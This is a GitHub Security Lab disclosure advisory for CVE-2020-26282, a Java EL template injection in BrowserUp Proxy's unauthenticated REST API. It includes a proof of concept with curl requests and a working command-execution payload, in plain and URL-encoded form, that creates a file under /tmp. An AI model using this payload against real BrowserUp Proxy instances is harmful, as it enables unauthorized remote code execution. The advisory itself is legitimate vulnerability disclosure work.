<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">January 12, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-213: Server-Side Template Injection in BrowserUp Proxy - CVE-2020-26282</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>11/10/2020: Report sent to ebeland@gmail.com</li>
  <li>12/22/2020: Fix is released</li>
</ul>

<h2 id="summary">Summary</h2>
<p>A Server-Side Template Injection was identified in BrowserUp Proxy enabling attackers to inject arbitrary Java EL expressions, leading to an unauthenticated Remote Code Execution (RCE) vulnerability.</p>

<h2 id="product">Product</h2>
<p>BrowserUp Proxy</p>

<h2 id="tested-version">Tested Version</h2>
<p>latest commit to the date of testing: 10147c3</p>

<h2 id="details">Details</h2>

<h3 id="remote-code-execution---javael-injection">Remote Code Execution - JavaEL Injection</h3>

<p>It is possible to run arbitrary code on the machine running the BrowserUp Proxy by injecting arbitrary Java Expression Language (EL) expressions.</p>

<p>BrowserUp Proxy uses Java Bean Validation (JSR 380) custom constraint validators such as  <a href="https://github.com/browserup/browserup-proxy/blob/master/browserup-proxy-rest/src/main/java/com/browserup/bup/rest/validation/PatternConstraint.java"><code class="language-plaintext highlighter-rouge">PatternConstraint</code></a>. When building custom constraint violation error messages, it is important to understand that they support different types of interpolation, including <a href="https://docs.jboss.org/hibernate/validator/5.1/reference/en-US/html/chapter-message-interpolation.html#section-interpolation-with-message-expressions">Java EL expressions</a>. Therefore if an attacker can inject arbitrary data in the error message template passed to <code class="language-plaintext highlighter-rouge">ConstraintValidatorContext.buildConstraintViolationWithTemplate()</code>, they will be able to run arbitrary Java code. Unfortunately, it is common that validated (and therefore, normally untrusted) bean properties flow into the custom error message. In this case <code class="language-plaintext highlighter-rouge">PatternConstraint</code> validates attacker controlled strings which are included in the custom constraint error validation message:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isValid</span><span class="o">(</span><span class="nc">String</span> <span class="n">value</span><span class="o">,</span> <span class="nc">ConstraintValidatorContext</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">if</span> <span class="o">(</span><span class="nc">StringUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">value</span><span class="o">))</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
      <span class="o">}</span>

      <span class="k">try</span> <span class="o">{</span>
        <span class="nc">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
      <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">errorMessage</span> <span class="o">=</span> <span class="nc">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"URL parameter '%s' is not a valid regexp"</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
        <span class="no">LOG</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="n">errorMessage</span><span class="o">);</span>

        <span class="n">context</span><span class="o">.</span><span class="na">buildConstraintViolationWithTemplate</span><span class="o">(</span><span class="n">errorMessage</span><span class="o">).</span><span class="na">addConstraintViolation</span><span class="o">();</span>
      <span class="o">}</span>
      <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>This vulnerability affects the REST API which is run in the standalone mode. The following are some of the entrypoints an attacker could use to supply an attack payload:</p>

<ul>
  <li>https://github.com/browserup/browserup-proxy/blob/master/browserup-proxy-rest/src/main/java/com/browserup/bup/rest/resource/entries/EntriesProxyResource.java
    <ul>
      <li>GET <code class="language-plaintext highlighter-rouge">/proxy/{port}/har/entries?=urlPattern=&lt;payload&gt;</code></li>
      <li>GET <code class="language-plaintext highlighter-rouge">/proxy/{port}/har/entries/assertResponseTimeLessThanOrEqual?=urlPattern=&lt;payload&gt;</code></li>
      <li>…</li>
    </ul>
  </li>
  <li>https://github.com/browserup/browserup-proxy/blob/master/browserup-proxy-rest/src/main/java/com/browserup/bup/rest/resource/mostrecent/MostRecentEntryProxyResource.java
    <ul>
      <li>GET <code class="language-plaintext highlighter-rouge">/proxy/{port}/har/mostRecentEntry?=urlPattern=&lt;payload&gt;</code></li>
      <li>…</li>
    </ul>
  </li>
</ul>

<p>The default configuration properties for the REST API allows unauthenticated access and binds the server to 0.0.0.0:</p>

<p><code class="language-plaintext highlighter-rouge">proxyUsername</code> - String, The username to use to authenticate with the chained proxy. Optional, <strong>default to null</strong>.</p>

<p><code class="language-plaintext highlighter-rouge">proxyPassword</code> - String, The password to use to authenticate with the chained proxy. Optional, <strong>default to null</strong>.</p>

<p><code class="language-plaintext highlighter-rouge">trustAllServers</code> - Boolean. True, Disables verification of all upstream servers’ SSL certificates. All upstream servers will be trusted, even if they do not present valid certificates signed by certification authorities in the JDK’s trust store. Optional, <strong>default to “false”</strong>.</p>

<p><code class="language-plaintext highlighter-rouge">bindAddress</code> - String, If running BrowserUp Proxy in a multi-homed environment, specify a desired bind address. Optional, <strong>default to “0.0.0.0”</strong>.</p>

<h4 id="poc">PoC</h4>

<p>In order to reproduce this vulnerability you can use the following steps:</p>

<ol>
  <li>Start BrowserUp Proxy either programmatically or using the standalone application:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$&gt; ./browserup-proxy -port 8080`
</code></pre></div>    </div>
  </li>
</ol>

<p>In a real attack scenario the proxy would be started by the victim while running tests or for other purposes. Note that the proxy is bound to all interfaces by default so an attacker could reach the test server if it is exposed</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$&gt; netstat -p tcp -van | grep LISTEN
tcp46      0      0  *.8081                 *.*                    LISTEN      131072 131072  91783      0 0x0100 0x00000006
tcp46      0      0  *.8080                 *.*                    LISTEN      131072 131072  91783      0 0x0000 0x00000006
...
</code></pre></div></div>

<ol>
  <li>Create a proxy instance (8081).</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$&gt; curl -X POST http://localhost:8080/proxy
{"port":8081}
</code></pre></div></div>

<p>Again, in an attack scenario, the proxy would already be started. If that is not the case, an attacker can start a new proxy since this action requires no authentication.</p>

<ol>
  <li>Create a new HAR</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$&gt; curl -X PUT http://localhost:8080/proxy/8081/har
</code></pre></div></div>

<ol>
  <li>Force a regexp parse error by using an unclosed parenthesis and inject the payload (eg: <code class="language-plaintext highlighter-rouge">${1+1}</code>)</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$&gt; curl -X GET http://localhost:8080/proxy/8081/har/entries\?urlPattern=foo%24%7B1%2B1%7D\(
{"errors":[{"name":"urlPattern","errors":["URL parameter 'foo2(' is not a valid regexp"]}]}
</code></pre></div></div>

<p>To run arbitrary commands try the following payload:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("touch /tmp/test")')}
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$&gt; curl -X GET http://localhost:8080/proxy/8081/har/entries\?urlPattern=%24%7b%27%27%2e%63%6c%61%73%73%2e%66%6f%72%4e%61%6d%65%28%27%6a%61%76%61%78%2e%73%63%72%69%70%74%2e%53%63%72%69%70%74%45%6e%67%69%6e%65%4d%61%6e%61%67%65%72%27%29%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%29%2e%67%65%74%45%6e%67%69%6e%65%42%79%4e%61%6d%65%28%27%6a%73%27%29%2e%65%76%61%6c%28%27%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%74%65%73%74%22%29%27%29%7d\(
{"errors":[{"name":"urlPattern","errors":["URL parameter 'java.lang.UNIXProcess@4cc4c20f(' is not a valid regexp"]}]}% 

</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">java.lang.UNIXProcess@583d3ad2</code> part proves that the process was run, and a filed called <code class="language-plaintext highlighter-rouge">test</code> will be written to <code class="language-plaintext highlighter-rouge">/tmp</code></p>

<h4 id="impact">Impact</h4>

<p>This issue leads to Remote Code execution</p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2020-26282</li>
</ul>

<h2 id="resources">Resources</h2>
<ul>
  <li>https://github.com/browserup/browserup-proxy/security/advisories/GHSA-wmfg-55f9-j8hq</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-213</code> in any communication regarding this